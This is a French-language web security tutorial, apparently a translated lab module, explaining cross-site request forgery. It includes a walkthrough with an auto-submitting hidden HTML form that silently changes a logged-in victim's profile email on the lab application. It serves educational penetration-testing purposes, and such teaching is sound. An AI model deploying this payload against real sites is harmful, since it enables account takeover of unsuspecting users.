Cross-Site Request Forgery (CSRF or XSRF)
===============================================

* * * * *

Les requêtes intersites sont courantes dans les applications Web et sont utilisées à de multiples fins légitimes.

Cross-Site Request Forgery (CSRF ou XSRF) est une attaque qui force un utilisateur final à exécuter des actions par inadvertance sur une application Web dans laquelle il est actuellement authentifié. Cette attaque est généralement montée à l'aide de pages Web conçues par l'attaquant que la victime doit visiter ou avec lesquelles interagir, en tirant parti de l'absence de mécanismes de sécurité anti-CSRF. Ces pages Web contiennent des requêtes malveillantes qui héritent essentiellement de l'identité et des privilèges de la victime pour exécuter une fonction indésirable au nom de la victime. Les attaques CSRF ciblent généralement des fonctions qui provoquent un changement d'état sur le serveur mais peuvent également être utilisées pour accéder à des données sensibles.

Une attaque CSRF réussie peut compromettre les données et les opérations de l'utilisateur final lorsqu'elle cible un utilisateur régulier. Si l'utilisateur final ciblé est un utilisateur administratif, une attaque CSRF peut compromettre l'ensemble de l'application Web.

Lors d'attaques CSRF, l'attaquant n'a pas besoin de lire la réponse du serveur à la requête intersite malveillante. Cela signifie que [la politique de même origine](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) ne peut pas être considérée comme un mécanisme de sécurité contre les attaques CSRF.

Rappel : Selon Mozilla, la politique de même origine est un mécanisme de sécurité critique qui restreint la façon dont un document ou un script chargé par une origine peut interagir avec une ressource d'une autre origine. La politique de même origine ne permettra pas à un attaquant de lire la réponse du serveur à une requête intersite malveillante.

Une application Web est vulnérable aux attaques CSRF lorsque :

-   Tous les paramètres requis pour la requête ciblée peuvent être déterminés ou devinés par l'attaquant
-   La gestion des sessions de l'application est uniquement basée sur les cookies HTTP, qui sont automatiquement inclus dans les requêtes du navigateur

Pour exploiter avec succès une vulnérabilité CSRF, nous avons besoin de :

-   Pour créer une page Web malveillante qui émettra une requête valide (intersites) se faisant passer pour la victime
-   La victime doit être connectée à l'application au moment où la requête intersite malveillante est émise

Lors de vos tests de pénétration d'applications Web ou de vos efforts de chasse aux bogues, vous remarquerez que de nombreuses applications ne disposent d'aucune protection anti-CSRF ou de protections anti-CSRF pouvant être facilement contournées.

Nous nous concentrerons sur le contournement des protections anti-CSRF dans les sections suivantes.

* * * * *

Exemple de contrefaçon de demande intersite
-------------------------------------------

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur `Reset Target`. Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'application cible et suivez-la. N'oubliez pas de configurer le vhost ( `xss.htb.net`) spécifié pour accéder à l'application.

Accédez `http://xss.htb.net`à l'application et connectez-vous à l'aide des informations d'identification ci-dessous :

-   Courriel : crazygorilla983
-   Mot de passe : poissons

Il s'agit d'un compte que nous avons créé pour examiner les fonctionnalités de l'application.

Exécutez Burp Suite comme suit.

```
dsgsec@htb[/htb]$ burpsuite

```

Activez le proxy de burp suite ( *Intercept On* ) et configurez votre navigateur pour le parcourir.

Maintenant, cliquez sur "Enregistrer".

Vous devriez voir ci-dessous.

![image](https://academy.hackthebox.com/storage/modules/153/28.png)

Nous ne remarquons aucun jeton anti-CSRF dans la demande de profil de mise à jour. Essayons d'exécuter une attaque CSRF contre notre compte (Ela Stienen) qui modifiera les détails de son profil en visitant simplement un autre site Web (tout en étant connecté à l'application cible).

Tout d'abord, créez et servez la page HTML ci-dessous. Enregistrez-le sous`notmalicious.html`

Code : html

```
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>

```

Si vous vous demandez comment nous nous sommes retrouvés avec le formulaire ci-dessus, veuillez consulter l'image ci-dessous. ![image](https://academy.hackthebox.com/storage/modules/153/29.png)

Nous pouvons servir la page ci-dessus à partir de notre machine d'attaque comme suit.

```
dsgsec@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...

```

Pas besoin de proxy pour le moment, alors ne faites pas passer votre navigateur par Burp Suite. Restaurez les paramètres de proxy d'origine du navigateur.

Tout en restant connecté en tant qu'Ela Stienen, ouvrez un nouvel onglet et visitez la page que vous servez depuis votre machine d'attaque `http://<VPN/TUN Adapter IP>:1337/notmalicious.html`. Vous remarquerez que les détails du profil d'Ela Stienen seront remplacés par ceux que nous avons spécifiés dans la page HTML que nous servons.

![image](https://academy.hackthebox.com/storage/modules/153/30.png)

Notre hypothèse selon laquelle il n'y a pas de protection CSRF dans l'application était correcte. Nous avons pu modifier les détails du profil d'Ela Stienen via une requête intersite.

Nous pouvons désormais utiliser la page Web malveillante que nous avons conçue pour exécuter des attaques CSRF contre d'autres utilisateurs.

Ensuite, nous verrons comment nous pouvons attaquer les applications dotées de mécanismes anti-CSRF.
